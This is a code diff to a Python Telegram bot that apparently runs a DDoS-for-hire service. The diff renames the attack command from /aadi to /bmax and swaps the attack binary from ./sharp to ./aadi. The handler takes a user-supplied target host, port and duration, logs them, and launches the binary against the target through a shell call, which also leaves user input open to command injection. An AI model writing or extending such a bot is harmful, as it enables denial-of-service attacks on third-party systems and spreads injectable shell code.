@@ -209,7 +209,7 @@ aadi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /aadi command
-@bot.message_handler(commands=['aadi'])
+@bot.message_handler(commands=['bmax'])
 def handle_aadi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -217,7 +217,7 @@ def handle_aadi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in aadi_cooldown and (datetime.datetime.now() - aadi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /aadi Command Again."
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /bmax Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -234,7 +234,7 @@ def handle_aadi(message):
                 record_command_logs(user_id, '/bmax', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sharp {target} {port} {time} 877"
+                full_command = f"./aadi {target} {port} {time} 877"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- Target: {target} Port: {port} Port: {time}"
         else:
